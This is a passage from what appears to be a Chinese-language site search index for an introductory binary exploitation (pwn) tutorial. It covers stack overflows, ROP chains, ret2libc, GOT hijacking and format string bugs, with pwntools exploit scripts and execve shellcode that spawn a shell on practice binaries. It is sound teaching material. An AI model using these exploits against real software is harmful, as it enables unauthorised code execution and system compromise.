\u53ef\u4ee5\u4f7f\u7528**\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e**\u7684\u4efb\u610f\u6808\u5730\u5740\u8bfb\uff0c\u5148\u8bfb\u53d6Canary\u7684\u503c\uff0c\u7136\u540e\u6808\u6ea2\u51fa\u65f6\u7279\u5730\u6dfb\u52a0\u56de\u53bb \u6216\u8005\u901a\u8fc7**\u4efb\u610f\u6808\u5730\u5740\u5199**\uff0c\u53ea\u6539return\u5730\u5740\u8fd9\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u4e0d\u52a8Canary NX \u00b6 \u53ef\u6267\u884c\u7684\u5730\u65b9\u4e0d\u80fd\u5199\uff0c\u53ef\u5199\u7684\u5730\u65b9\u4e0d\u53ef\u6267\u884c \u7ed5\u8fc7\u65b9\u6cd5ROP\uff0c\u7528\u5df2\u6709\u7684\u7247\u6bb5\u6784\u5efaROP\u94fe\u5b50\uff08\u7528\u4f60\u672c\u8eab\u4ee3\u7801\u6267\u884c\uff0c\u6211\u4e0d\u53bb\u5199\u4e86\uff09 ASLR \u00b6 \u7a7a\u95f4\u5730\u5740\u968f\u673a\u5316\uff1a\u6bcf\u6b21\u6267\u884c\u7a0b\u5e8f\u65f6stack\u3001heap\u3001library\u7684\u5730\u5740\u90fd\u4e0d\u4e00\u6837\uff08\u57fa\u5740\u4e0d\u540c\uff0c\u504f\u79fb\u4e00\u81f4\uff09 PIE \u00b6 \u5f00\u542f\u540ecode\u6bb5\u548cdata\u6bb5\uff08text\u6bb5\uff09\u4e5f\u4f1a\u542f\u7528ASLR IDA\u6253\u5f00\u53d1\u73b0text\u6bb5\uff08\u4ee3\u7801\u6bb5\uff09\u524d\u9762\u53ea\u80fd\u663e\u793a\u540e3\u4f4d\uff08\u504f\u79fb\uff09\uff0c\u524d\u9762\u90fd\u662f0 RELRO \u00b6 checksec\u7684\u7ed3\u679c\uff1a FULL RELRO\u8868\u793a\u6539\u4e0d\u4e86got\u8868 Partial RELRO\u8868\u660e\u542f\u7528\u4e86\u61d2\u52a0\u8f7dLazy Binding\uff0c\u53ef\u4ee5\u6539got\u8868 GOT Hijack \u00b6 Lazy Binding \u61d2\u52a0\u8f7d \u00b6 \u6240\u6709\u7684lib\u4e0d\u4f1a\u5168\u90fd\u8c03\u7528\uff0c\u53ea\u6709\u521d\u6b21\u4f7f\u7528\u65f6\u624d\u4f1a\u52a0\u8f7d\uff08\u628a\u9700\u8981\u8c03\u7528\u7684\u5e93\u51fd\u6570\u5730\u5740\u5199\u5165GOT\u8868\uff09 \u8bf4\u660e\u5f00\u542fLazy Binding\u65f6GOT\u8868\u662f\u53ef\u5199\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u540e\u671f\u4e5f\u53ef\u4ee5\u4fee\u6539GOT\u8868\u7684\u503c\uff0c\u8ba9\u8be5\u51fd\u6570\u6307\u5411\u5176\u4ed6\u5730\u65b9 \u4e5f\u53ef\u4ee5\u4fee\u6539GOT\u6307\u5411\u5730\u5740\u7684\u5185\u5bb9\uff0c\u672c\u8d28\u4e0a\u662f\u66ff\u6362\u51fd\u6570\u7684\u5185\u5bb9 GOT\u8868\u96c6\u4e2d\u5b58\u50a8\u4e86**\u6bcf\u4e2a\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740** ROP \u00b6 \u901a\u8fc7\u4e0d\u65ad\u53bb\u6267\u884c\u5305\u542bret\u7684\u7a0b\u5e8f\u6c47\u7f16\u7247\u6bb5\u6765\u8fbe\u5230\u60f3\u8981\u7684\u5bc4\u5b58\u5668\u64cd\u4f5c \u8fd9\u4e9b\u5305\u542bret\u7684\u6c47\u7f16\u7a0b\u5e8f\u7247\u6bb5\u53eb\u505agadget \u7531\u4f17\u591a\u7684ROP gadget\u4e32\u6210ROP Chain\u6765\u4f5c\u4e3a\u6211\u4eec\u7684shellcode 4004fa: 48 83 c4 08 add rsp, 0x8 4004fe: c3 ret 4005b8: 5d pop rbp 4005b9: c3 ret 4006c4: c9 leave 4006c5: c3 ret 400730: 41 5e pop r14 400732: 41 5f pop r15 400734: c3 ret \u6b64\u65f6\u6211\u4eec\u5f80\u6808\u4e0a\u4ece\u4e0a\u5f80\u4e0b\u586b\u5145\u6570\u636e\u65f6\u9700\u8981\u4f9d\u6b21\u5199\u5165\u8df3\u8f6c\u5730\u5740\uff0c\u8fdb\u5165\u7247\u6bb5\u6267\u884c\u5b8cgadget\u540e\u4f1a\u81ea\u52a8\u8df3\u56de\u5230\u4e3b\u51fd\u6570 4004fa 4005b8 4006c4 400730 ...... \u6700\u7ec8\u6784\u9020\u51faexecve\u51fd\u6570(0x3b) pop rdi\uff0c\u628a\u6808\u9876\u7684\u503c\u8d4b\u7ed9rdi\uff0c\u6b64\u65f6rdi=0x6bb2e0\uff0c\u521a\u597d\u662fbss\u6bb5\u5730\u5740 pop rsi\uff0c\u628a\u6808\u9876\u7684\u503c\uff08 /bin/sh\\x00 \u7684\u6307\u9488\u5730\u5740\uff09\u8d4b\u7ed9rsi mov qword ptr [rdi], rsi\uff0c\u628arsi\u7684\u503c\u79fb\u52a8\u5230rdi\u6307\u9488\u6240\u6307\u5411\u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f\u628a /bin/sh\\x00 \u5199\u5165bss\u4e2d pop rsi\uff0c\u628arsi\u8d4b\u503c\u4e3a0 pop rdx\uff0c\u628ardx\u8d4b\u503c\u4e3a0 pop rax\uff0c\u628arax\u8d4b\u503c\u4e3a0x3b syscall\uff0c\u6b64\u65f6rax\u662f0x3b\uff0c\u4e5f\u5c31\u662f\u6267\u884c\u4e86execve\u51fd\u6570\uff0c\u5404\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u4e4b\u524d\u4e5f\u94fa\u57ab\u597d\u4e86 Return to PLT \u00b6 \u4f9d\u65e7\u662fROP\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u6b21\u9700\u8981\u6784\u9020 system(\"sh\"); \u51fd\u6570\u3002 \u8981\u83b7\u5f97shell\u9700\u8981\u505a\u5982\u4e0b\u6b65\u9aa4\uff1a \u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740\u3002 \u83b7\u53d6\u201c/bin/sh\u201d\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002 \u5c06RDI\u4e2d\u7684\u503c\uff0c\u6539\u6210\u201c/bin/sh\u201d\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002 **\u5168\u5c40\u504f\u79fb\u8868\uff08GOT\uff09**\u5305\u542b\u6bcf\u4e2a\u5168\u5c40\u53d8\u91cf\u76844\u5b57\u8282\u6761\u76ee\uff0c\u5176\u4e2d4\u5b57\u8282\u6761\u76ee\u5305\u542b\u5168\u5c40\u53d8\u91cf\u7684\u5730\u5740\u3002 **\u8fc7\u7a0b\u94fe\u63a5\u8868\uff08PLT\uff09**\u5305\u542b\u6bcf\u4e2a\u5168\u5c40\u51fd\u6570\u7684\u5b58\u6839\u4ee3\u7801\u3002\u4ee3\u7801\u6bb5\u4e2d\u7684\u8c03\u7528\u6307\u4ee4\u4e0d\u76f4\u63a5\u8c03\u7528\u51fd\u6570\uff08'function'\uff09\uff0c\u800c\u662f\u8c03\u7528\u5b58\u6839\u4ee3\u7801\uff08function@PLT\uff09\u3002 \u539f\u7406\uff1a \u7528ida\u53cd\u7f16\u8bd1\u76ee\u6807\u7a0b\u5e8f\u540e\u53d1\u73b0\u5176\u4e2d\u6709printf,gets ,setvbuf\uff0c\u5728\u5185\u5b58\u8fd9\u51e0\u4e2a\u51fd\u6570\u7684got\u8868\u5730\u5740\u662f\u56fa\u5b9a\u7684\u3002 \u5728\u6267\u884cprintf\u51fd\u6570\u524d\uff0cedi\u6307\u5411\u7684\u662f\u683c\u5f0f\u5316\u4e32\uff0crsi\u6307\u5411\u7684\u662f\u88ab\u6253\u5370\u4e32\u7684\u5730\u5740\u3002 \u5982\u679c\u63a7\u5236\u4e86rsi\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6253\u5370\u4efb\u4f55\u5730\u5740\u7684\u5185\u5bb9\u3002 \u7136\u540e\u901a\u8fc7\u5f53\u524d\u51fd\u6570\u5730\u5740(gets) - system = \u504f\u79fb\u5730\u5740 (\u4e24\u4e2a\u51fd\u6570\u7684\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684)\uff0c\u5f97\u5230\u4e00\u4e2a\u56fa\u5b9a\u7684\u76f8\u5bf9\u504f\u79fb\u5730\u5740\u3002 \u5f97\u5230\u504f\u79fb\u5730\u5740\u540e\u901a\u8fc7\u5f53\u524d\u5730\u5740\u52a0\u4e0a\u504f\u79fb\u5f97\u5230system\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740\uff0c\u7136\u540e\u4f20\u5165\u2019/bin/sh\u2019\uff0c\u6267\u884csystem\u5c31\u8fbe\u5230\u76ee\u7684\u3002 Return to libc \u00b6 \u901a\u8fc7 ROPgadget --binary ./gothijack | grep \"pop rax\" \u53d1\u73b0\uff0c\u81ea\u5df1\u5199\u7684\u4ee3\u7801\u6ca1\u6709\u6240\u9700\u8981\u540e\u9762\u7d27\u8ddf\u7740ret\u7684gadget\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6784\u9020ROP\u3002 \u7136\u800clibc\u4e2d\u4ee3\u7801\u975e\u5e38\u591a\uff0c\u6240\u9700\u8981\u7684\u7247\u6bb5\uff08execve\u6216\u8005system\u51fd\u6570\uff09\u901a\u5e38\u90fd\u80fd\u641c\u5230\u3002 \u6240\u6709\u7248\u672c\u7684libc\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230 libc database search \u6839\u636eputs\u51fd\u6570\u7684\u5730\u5740\u548c\u504f\u79fb\uff0c\u8ba1\u7b97\u51falibc\u57fa\u5740\uff0c\u518d\u6839\u636esystem\u51fd\u6570\u7684\u504f\u79fb\uff0c\u8ba1\u7b97\u51fasystem\u51fd\u6570\u7684\u5730\u5740\u3002 \u83b7\u5f97libc\u5730\u5740\u7684\u5730\u65b9\u6709\uff1a\u6808\u3001\u5806\u3001got\uff0c\u6808\u4e2d\u5b58\u7740\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\uff0c\u504f\u79fb\u901a\u8fc7libc\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\uff0c\u57fa\u5740\u5c31\u6709\u4e86\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u00b6 \u5e38\u89c1\u51fd\u6570 \u00b6 \u51fd\u6570 \u57fa\u672c\u4ecb\u7ecd printf \u8f93\u51fa\u5230stdout\u8f93\u5165 fprintf \u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 vprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230stdout vfprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 sprintf \u8f93\u51fa\u5230\u5b57\u7b26\u4e32 snprintf \u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32 vsprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32 vsnprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32 setproctitle \u8bbe\u7f6eargv \u6f0f\u6d1e\u539f\u7406 \u00b6 \u4ee5 printf \u4e3a\u4f8b\uff0c\u51fd\u6570\u4f1a\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u53c2\u6570\u3002\u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u7684\u6807\u51c6\u8f93\u51fa \u82e5\u5f53\u524d\u5b57\u7b26\u662f%\uff0c\u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff1a \u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519 \u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%\uff0c\u8f93\u51fa% \u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa printf ( \"Color %s, Number %d, Float %4.2f\" ); \u5176\u4e2d\uff1a %s \u8f93\u51fa\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u82e5\u5730\u5740\u5bf9\u5e94\u7a7a\u95f4\u4e0d\u5408\u6cd5\u5c31\u4f1a\u5d29\u6e83 %d \u8f93\u51fa\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u578b\u503c %4.2f \u8f93\u51fa\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c \u8865\u5145\uff1a %d \u6216\u8005 %i \uff0c\u6709\u7b26\u53f7\u6574\u6570 %u \uff0c\u65e0\u7b26\u53f7\u6574\u6570 %x \u6216\u8005 %X \uff0c16\u8fdb\u5236\u65e0\u7b26\u53f7\u6574\u5f62\uff0c\u5c0fx\u8f93\u51fa\u5c0f\u5199\u768416\u8fdb\u5236\uff0c\u5927X\u8f93\u51fa\u5927\u5199\u768416\u8fdb\u5236 %o \uff0c8\u8fdb\u5236\u65e0\u7b26\u53f7\u6574\u5f62 %c \uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26 %p \uff0c\u540e\u8ddf &a \u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u5730\u5740 %n \uff0c\u5199\u5165\u5b57\u7b26\u4e2a\u6570 \u6cc4\u9732\u5185\u5b58 \u00b6 \u6cc4\u9732\u6808\u5185\u5185\u5b58 \u00b6 \u4f7f\u7528 %x \u3001 %p \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58 \u4f7f\u7528 %s \u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9 \u4f7f\u7528 %order$x \u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff08order\u4e3a\u6808\u5185\u504f\u79fb\uff09 \u4f7f\u7528 %order$s \u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u503c\uff08order\u4e3a\u6808\u5185\u504f\u79fb\uff09 \u6cc4\u9732\u4efb\u610f\u5185\u5b58 \u00b6 \u5047\u8bbe\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u7b2ck\u4e2a\u53c2\u6570\uff0c\u90a3\u4e48\u53ef\u4ee5\u901a\u8fc7 addr%k$s \u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9 \u8986\u76d6\u5185\u5b58 \u00b6 %n \u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684**\u5b57\u7b26\u4e2a\u6570** \u5199\u5165 \u5bf9\u5e94\u7684\u6574\u5f62\u6307\u9488\u6240\u6307\u7684\u53d8\u91cf\uff0c\u683c\u5f0f\u4e3a\uff1a [\u586b\u5145\u5185\u5bb9][\u9700\u8981\u8986\u76d6\u7684\u5730\u5740][\u586b\u5145\u5185\u5bb9]%[\u6240\u8986\u76d6\u5730\u5740\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7b2c\u51e0\u4e2a\u53c2\u6570]$n","title":"PWN\u5165\u95e8"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#pwn","text":"","title":"PWN\u5165\u95e8"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_1","text":"objdump\uff1a objdump -d -M intel ./bof readelf\uff1a readelf -a ./bof IDA Pro GDB-PEDA\uff1achecksec\u3001vmmap\u3001find \u76f4\u63a5\u8fd0\u884c gdb ./pwn python\u901a\u8fc7pwn process\u8fd0\u884c\uff0cdebug\u6a21\u5f0f\u80fd\u770b\u5230\u8fdb\u7a0b\u53f7\uff0c\u7136\u540e gdb attach 6223 \u63a5\u7ba1\u8c03\u8bd5 \u8fdb\u5165pwndbg\u540e\u53ef\u4ee5\u4f7f\u7528 stack 30 \u3001 x/40sx 0x7ffd65627058 \u7b49\u547d\u4ee4 Pwntools\uff1a from pwn import * context . log_level = 'debug' #context(arch = 'i386', os = 'linux') p = remote ( 'x.x.x.x' , 23333 ) #p = process('./hello') addr = 0x400586 payload = 'a' * 0x18 + p64 ( addr ) p . sendline ( payload ) #p.send(asm(shellcraft.sh())) p . interactive () \u5e38\u7528\u65b9\u6cd5\uff1a p64 ( int ) 0xfaceb00c => ' \\x0c\\xb0\\xce\\xfa\\x00\\x00\\x00\\x00 ' u64 ( str ) ' \\x0c\\xb0\\xce\\xfa\\x00\\x00\\x00\\x00 ' => 0xfaceb00c p32 ( int ) 0xfaceb00c => ' \\x0c\\xb0\\xce\\xfa ' u32 ( str ) ' \\x0c\\xb0\\xce\\xfa ' => 0xfaceb00c remote ( host , port ) / process ( path ) . recv ( int ) 7 => Hello world ! => 'Hello w' . recvuntil ( str ) 'or' => Hello world ! => 'Hello wor' . recvline () === . recvuntil ( ' \\n ' ) . send ( str ) 'payload' => 'payload' . sendline ( str ) 'payload' => 'payload \\n ' . interactive ()","title":"\u4ecb\u7ecd"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_2","text":"rodata\uff1aread only data\uff0c\u9759\u6001\u8d44\u6e90\uff0c\u5e38\u91cf\u3001\u5b57\u7b26\u4e32\u7b49 got\uff1a\u4e00\u4e2a\u5b57\u5178\uff0c\u5b58\u4e86\u6bcf\u4e2a\u51fd\u6570\uff08\u5305\u62ec\u5e93\u51fd\u6570\uff09\u7684\u5730\u5740 bss\uff1a\u5168\u5c40\u53d8\u91cf\u5b58\u50a8\u5728\u6b64\uff0c\u4e34\u65f6\u53d8\u91cf\u5b58\u5728\u6808\u4e2d\uff0c\u4f1a\u968f\u7740\u6808\u6d88\u5931 text\uff1a\u4ee3\u7801\u6bb5\uff08\u4ee3\u7801\u7684\u6c47\u7f16\u6307\u4ee4\uff09","title":"\u4e8c\u8fdb\u5236\u683c\u5f0f"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_3","text":"","title":"\u51fd\u6570\u8c03\u7528\u4f20\u53c2"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#x64","text":"\u8ddf\u636e\u51fd\u6570\u53c2\u6570\u4ece\u5de6\u5230\u53f3\u7684\u987a\u5e8f\uff0c\u5728\u8c03\u7528\u51fd\u6570\u524d\u9700\u5c06\u4e34\u65f6\u53d8\u91cf\u6309\u987a\u5e8f\u5b58\u5165**\u5bc4\u5b58\u5668**\uff1a rdi, rsi, rdx, rcx, r8, r9 \u591a\u4f59\u7684\u4e34\u65f6\u53c2\u6570\u5c06\u4ece\u540e\u5f80\u524d\u4f9d\u6b21\u653e\u5165\u6808\u4e2d\uff08\u5148\u8fdb\u540e\u51fa\uff09 \u5c06\u51fd\u6570\u7684**\u8fd4\u56de\u5730\u5740\u5b58\u5165rax**","title":"X64"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#x86","text":"32\u4f4d\u4f20\u53c2\u662f**\u4e0d\u4f7f\u7528\u5bc4\u5b58\u5668**\u7684\uff0c\u5168\u9760\u6808\u50a8\u5b58\u53c2\u6570\uff0c\u5373\uff1a push 0x800 push 0x700 push 0x600 push 0x500 push 0x400 push 0x300 push 0x200 push 0x100 call foo \u5e76\u4e1464\u4f4d\u6808\u5bbd\u5ea6\u662f8\u5b57\u8282(16\u4f4d)\uff0c\u800c32\u4f4d\u6808\u5bbd\u5ea6\u662f4\u5b57\u8282","title":"X86"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_4","text":"","title":"\u6808\u683c\u5f0f"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_5","text":"\u5f53\u524d\u6808\u7a7a\u95f4\u7ed3\u679c\uff0c\u51c6\u5907\u6267\u884ccall\u51fd\u6570 \u6ce8\u610f\uff1a rip\u7684\u503c\u6307\u5411\u4e0b\u4e00\u6761\u6c47\u7f16\u547d\u4ee4 \u6267\u884c\u5230call\u51fd\u6570\uff0c\u9996\u5148\u4fee\u6539rip\u7684\u503c\uff0c\u5e76\u4e14\u5c06call\u7684\u4e0b\u4e00\u6761\u547d\u4ee4\u7684\u5730\u5740\u5165\u6808\uff08\u4e3a\u4e86ret\u65f6\u5019\u8df3\u56de\u5230\u76f8\u5e94\u4f4d\u7f6e\uff09 \u7136\u540e\u6b63\u5f0f\u8fdb\u5165\u51fd\u6570\uff0c\u9996\u5148\u8fd8\u662f\u901a\u7528\u65b9\u6cd5\u5f00\u8f9f\u6808\u7a7a\u95f4 4004e7: push rbp 4004e8: mov rbp, rsp 4004eb: sub rsp, 0x10 \u7b2c\u4e00\u6b65\uff1a\u5c06\u539f\u5730\u5740\u6808\u5e95rbp\u5165\u6808 \u7b2c\u4e8c\u6b65\uff1a\u5c06\u65b0\u6808\u9876\u6307\u9488\u6307\u5411\u5f53\u524d\u6808\u5e95\u6307\u9488 \u7b2c\u4e09\u6b65\uff1a\u5c06\u6808\u9876\u6307\u9488\u4e0a\u79fb\uff0c\u5f00\u8f9f\u51fa0x10\uff0c\u537316\u5b57\u8282\u7a7a\u95f4 \u6700\u540e\u5c31\u53ef\u4ee5\u5f80\u5f00\u8f9f\u7684\u7a7a\u95f4\u91cc\u5199\u5165\u51fd\u6570\u5c40\u90e8\u53d8\u91cf\u4e86","title":"\u51fd\u6570\u8c03\u7528"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_6","text":"\u6267\u884c\u5b8c\u51fd\u6570\u903b\u8f91\uff0c\u901a\u5e38\u901a\u8fc7leave\u3001ret\u8fd4\u56de\u5230\u4e3b\u51fd\u6570 \u9996\u5148\u662fleave\uff0c\u867d\u7136\u6c47\u7f16\u5c31\u4e00\u884c\uff0c\u4f46\u5176\u5b9e\u672c\u8d28\u4e0a\u6267\u884c\u4e86 mov rsp, rbp pop rbp \u7b2c\u4e00\u6b65\uff1a\u6e05\u7a7a\u6808\u7a7a\u95f4\uff0c\u5c06\u6808\u9876\u6307\u9488\u6307\u5411\u6808\u5e95 \u7b2c\u4e8c\u6b65\uff1a\u5c06\u5f39\u51fa\u7684\u503c\u8d4b\u7ed9rbp\uff0c\u6240\u4ee5\u73b0\u5728\u6808\u5e95\u6307\u5411\u6700\u521d\u7684\u6808\u5e95 \u7136\u540e\u6267\u884cret\uff0c\u5373pop\u5f53\u524d\u6808\u9876\u7684\u503c\u81f3rip \u7531\u4e8erip\u4e3a\u4e0b\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\uff0c\u90a3\u4e48\u5c31\u521a\u597d\u56de\u5230\u4e3b\u51fd\u6570call\u7684\u540e\u9762\u4e86","title":"\u51fd\u6570\u8fd4\u56de"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_7","text":"\u6240\u4ee5\u5982\u679c\u51fd\u6570\u4e34\u65f6\u53d8\u91cf\u7684\u503c\u53ef\u4ee5\u8f93\u5165\uff0c\u5e76\u4e14\u8d85\u4e86\u6240\u5206\u914d\u7684\u6808\u7a7a\u95f4 \u5982\u679c\u6211\u4eec\u80fd\u8986\u76d6\u5230rip\u7684\u503c\uff08\u8fd4\u56de\u5730\u5740\uff09\uff0c\u5c31\u80fd\u52ab\u6301\u6267\u884c\u6d41","title":"\u6808\u6ea2\u51fa"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#return-to-text","text":"\u5373\u8fd4\u56de\u7684\u6307\u9488\u6307\u5411\u5230Text\u6bb5\uff0c\u901a\u5e38\u4e3a\u540e\u95e8\u51fd\u6570 \u8986\u76d6\u53d8\u91cf\u5f00\u8f9f\u7684\u7a7a\u95f4+8\u5b57\u8282\u7684old rbp \u6700\u540e\u52a0\u8fdb\u53bb\u540e\u95e8\u51fd\u6570\u5730\u5740\u5373\u53ef from pwn import * io = process ( './bof' ) backdoor = 0x400607 io . recvuntil ( 'TEXT:' ) payload = b 'a' * 0x18 + p64 ( backdoor ) io . sendline ( payload ) io . interactive ()","title":"Return to Text"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#return-to-shellcode","text":"\u8fd9\u6b21\u6ca1\u6709\u73b0\u6210\u7684\u540e\u95e8\u51fd\u6570\u4e86\uff0c\u53ea\u80fd\u6211\u4eec\u81ea\u5df1\u627e\u4e00\u5757**\u540c\u65f6\u53ef\u8bfb\u53ef\u5199**\u7684\u5730\u5740\u5199\u5165shellcode \u7136\u540e\u8986\u76d6\u8fd4\u56de\u5730\u5740\u81f3\u6211\u4eec\u7684shellcode\u5373\u53ef \u4e00\u822cshellcode\u8c03\u7528execve\u51fd\u6570 int execve ( const char * filename , char * const argv [], char * const envp []); \u6839\u636e\u51fd\u6570\u4f20\u53c2\u65b9\u5f0f\uff1a \u7b2c\u4e00\u4e2a\u53d8\u91cffilename\u5b58\u5728rdi\u4e2d\uff0c\u8d4b\u503c\u4e3a /bin/sh \u7684\u5730\u5740 \u7b2c\u4e8c\u4e2a\u53d8\u91cfargv\u5b58\u5728rsi\u4e2d\uff0c\u8d4b\u503c\u4e3a0x0 \u7b2c\u4e09\u4e2a\u53d8\u91cfenvp\u5b58\u5728rdx\u4e2d\uff0c\u8d4b\u503c\u4e3a0x0 \u6700\u540e\u8c03\u7528syscall\u524d\u9700\u6307\u660e\u9700\u8981\u8c03\u7528\u7684\u51fd\u6570\uff0c\u901a\u8fc7\u67e5**Linux\u7cfb\u7edf\u8c03\u7528\u8868**(system call table)\uff0c0x3b\u4ee3\u8868syscall\uff0c\u6240\u4ee5\u9700\u8981\u7ed9rax\u8d4b\u503c\u4e3a0x3b \u5373\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a 0x h s / n i b / mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall \u4f8b\uff1a\u5141\u8bb8\u5f80bss\u6bb5\u5168\u5c40\u53d8\u91cf\u5199\u5165\uff0c\u4ee5\u53ca\u5c40\u90e8\u53d8\u91cf\u5b58\u5728\u6808\u6ea2\u51fa from pwn import * io = process ( './ret2sc' ) context . arch = 'amd64' shellcode_addr = 0x601060 sc = asm ( shellcraft . sh ()) io . recvuntil ( 'quanju:' ) io . send ( sc ) #\u5f80bss\u6bb5\u5199shellcode io . recvuntil ( 'linshi:' ) payload = b 'a' * 0x18 + p64 ( shellcode_addr ) io . sendline ( payload ) #\u8986\u76d6\u8fd4\u56de\u5730\u5740\u8df3\u5230shellcode io . interactive () bss\u6bb5\u5373\u53ef\u5199\u53c8\u53ef\u6267\u884c\uff0c\u524d\u63d0\u662f\u6ca1\u5f00NX","title":"Return to Shellcode"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_8","text":"","title":"\u6808\u4fdd\u62a4\u65b9\u6cd5"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#canary","text":"\u5728old rbp\u524d\u52a0\u5165\u968f\u673a\u6570\uff0c\u6808\u56de\u6536\u65f6\u68c0\u67e5\u8be5\u6570\u662f\u5426\u88ab\u7be1\u6539 \u53ef\u4ee5\u4f7f\u7528**\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e**\u7684\u4efb\u610f\u6808\u5730\u5740\u8bfb\uff0c\u5148\u8bfb\u53d6Canary\u7684\u503c\uff0c\u7136\u540e\u6808\u6ea2\u51fa\u65f6\u7279\u5730\u6dfb\u52a0\u56de\u53bb \u6216\u8005\u901a\u8fc7**\u4efb\u610f\u6808\u5730\u5740\u5199**\uff0c\u53ea\u6539return\u5730\u5740\u8fd9\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u4e0d\u52a8Canary","title":"Canary"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#nx","text":"\u53ef\u6267\u884c\u7684\u5730\u65b9\u4e0d\u80fd\u5199\uff0c\u53ef\u5199\u7684\u5730\u65b9\u4e0d\u53ef\u6267\u884c 